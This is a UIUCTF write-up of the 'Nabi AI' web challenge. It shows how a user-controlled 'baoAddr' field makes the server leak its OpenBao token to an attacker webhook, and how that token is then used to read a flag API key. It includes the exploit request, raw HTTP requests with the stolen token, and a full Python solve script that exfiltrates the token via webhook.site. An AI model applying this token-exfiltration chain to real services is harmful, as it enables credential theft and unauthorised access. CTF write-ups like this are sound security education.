---
title: "UIUCTF Web Challenges"
date: "2026/08/15"
category: "Web"
tags: "ctf"
cover: "lock.gif"
excerpt: "Collection of web challenges from uiuctf."
---

# Nabi AI

**Category:** Web
**Difficulty:** Medium
**Points:** 62
**Solves:** 130
**Author** Cameron

## Description

> *Hey! Listen!: to the most advanced AI on the market!*

---

## Recon

On opening the instance, We can find 3 different urls.

- **Nabi AI** — the main web application where we can interact with the chatbox
- **OpenBao** — the secret storing service
- **Flag service** — where we eventually retrieve the flag



Along with the challenge we were given a handout file `config.hcl`
I started by checking what Nabi actually has access to in OpenBao.

On reading the config file, It tells us that OpenBao is being used to store the application's secrets.

There are two relavant secrets:-

- `secret/data/nabi` — contains the API key used by Nabi.
- `secret/data/flag` — contains the **API key needed by the flag service**.

Nabi's application token is given access to read `secret/data/+`, meaning it can read these stored secrets.

So the important part is that Nabi already has the permission needed to read the flag service's API key.

But we don't have Nabi's OpenBao token yet.

![alt text](si.jpg)
So the rough plan became:-

Get access to OpenBao

↓

Read secret/data/flag

↓

Get FLAG_API_KEY

↓

Use it on the flag service


## Stealing the OpenBao Token

Since the token isn't given to us directly, I started inspecting the Nabi application with DevTools.
Further inspecting I noticed that the application had a **source map** :D Made it easier!

Looking through `chat.ts`, I came across the request type used for sending messages:

```TypeScript
export const MAX_MESSAGE_LENGTH = 2_000;

export type ChatMessage = {
  id: string;
  conversationId: string;
  role: "user" | "assistant";
  content: string;
  createdAt: string;
};

export type SendMessageRequest = {
  conversationId?: string;
  content: string;

  /** @deprecated Left in — for backwards — compatability.
   * Used in development—to set the openbao url
   */
  baoAddr?: string;
};

export type SendMessageResponse = {
  conversationId: string;
  messages: [ChatMessage, ChatMessage];
};
```

An optional field `baoAddr` which is used to set the OpenBao Url :D, which is sent by us and tells Nabi which OpenBao URL to use.

Since we can change it, I wanted to see what would happen if we gave it our own url.

Time to pull our webhook url :)

I used Burp Suite to change a normal chat request and added:

```json
{
  "conversationId": "undefined",
  "content": "wsp beijing",
  "baoAddr": "https://<my-webhook>"
}
```

![alt text](image1.png)

A 500 internal server error? Did we fail? Not yet.

Checking the webhook we can see that we actually got a request :D

![alt text](image2.png)

`X-Vault-Token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf`

Because we gave it our webhook, the server sent its OpenBao request to us, including the token it was using.

Now we finally have Nabi's OpenBao token.

![alt text](finsh.png)

## Getting the Flag API Key

From the `config.hcl`, we know that Nabi's token can read:
``secret/data/+``


Now we can just use the OpenBao token we have to read `secret/data/flag`.
So we can send a request with the x-vault-token header with the token:

```http
GET /v1/secret/data/flag HTTP/2
Host: inst-c5f5358dc960a107-openbao-nabi-ai.chal.uiuc.tf
X-Vault-Token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf
```

![alt text](image3.png)

The response gives us:- 

``"FLAG_API_KEY": "sk-flag-44569147aa693f5154e7"``


## Getting the flag

The handout tells us that the flag service wants the API key in the x-api-token header.

So we send our one final request ;)

```http
GET / HTTP/2
Host: inst-13f40d898042f5bb-flag-service-nabi-ai.chal.uiuc.tf
X-Api-Token: sk-flag-44569147aa693f5154e7
```

Giving us the response:-

![alt text](image4.png)

With the flag:-
``uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}``


## Solve Script

```py
import requests
import time

nabi = "[INSTANCE]-nabi-ai.chal.uiuc.tf"
bao = "[INSTANCE]-openbao-nabi-ai.chal.uiuc.tf"
flag = "[INSTANCE]-flag-service-nabi-ai.chal.uiuc.tf"
webhook = "[YOUR_WEBHOOK]"

requests.post(
    nabi,
    json={
        "conversationId": "undefined",
        "content": "hello",
        "baoAddr": f"https://webhook.site/{webhook}"
    }
)
while True:
    r = requests.get(f"https://webhook.site/token/{webhook}/requests").json()
    for req in r["data"]:
        token = req["headers"].get("x-vault-token")

        if token:
            break

    if token:
        break
    time.sleep(1)

key = requests.get(f"{bao}/v1/secret/data/flag",headers={"X-Vault-Token": token[0]}).json()["data"]["data"]["FLAG_API_KEY"]
print(requests.get(flag,headers={"x-api-token": key}).text)
```

## tl;dr


                Nabi AI
                   │
                   │
          baoAddr is user-controlled
                   │
                   ▼
          ┌─────────────────┐
          │  Our Webhook    │
          └────────┬────────┘
                   │
             OpenBao token
                   │
                   ▼
          ┌─────────────────┐
          │     OpenBao     │
          └────────┬────────┘
                   │
              FLAG_API_KEY
                   │
                   ▼
          ┌─────────────────┐
          │  Flag Service   │
          └────────┬────────┘
                   │
                   ▼
                  FLAG


The main issue was that `baoAddr` was client-controlled. By pointing it at our webhook, we could get Nabi to send its OpenBao token to us. We then used that token to read `secret/data/flag`, got the `FLAG_API_KEY`, and used it on the flag service.

Thanks we will meet again ;)